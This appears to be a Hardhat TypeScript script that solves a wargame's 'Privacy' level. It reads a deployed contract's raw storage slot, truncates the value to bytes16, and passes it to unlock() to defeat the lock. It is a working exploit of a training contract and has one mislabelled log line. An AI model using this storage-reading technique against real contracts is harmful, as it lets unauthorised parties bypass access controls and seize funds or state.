import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { Privacy__factory } from '../../typechain-types';
import { Bytecode } from 'hardhat/internal/hardhat-network/stack-traces/model';

const func:DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const privacyAddress = "0x3005eD3b02bb0509DF343E8B92ED846c76513cd5";

    console.log("Attach Privacy Contract");
    const Privacy = await ethers.getContractFactory("Privacy",(await ethers.getSigners())[0]) as Privacy__factory;
    const privacy = Privacy.attach(privacyAddress);
    console.log("first locked is:",await privacy.locked());
    
    const solt5 = await ethers.provider.getStorageAt(privacyAddress,5)
    //获取
    console.log("get Privacy data[2](solt[3]):",solt5); 
    const solt16 = solt5.substring(0,34)
    console.log("solt16 bytes16 :",solt16.length);
    

    //解锁
    const privacyArgs =await privacy.unlock(solt16);
    await privacyArgs.wait();
    console.log("seconds locked is:",await privacy.locked());

    
}

export default func;
func.tags = ['Privacy'];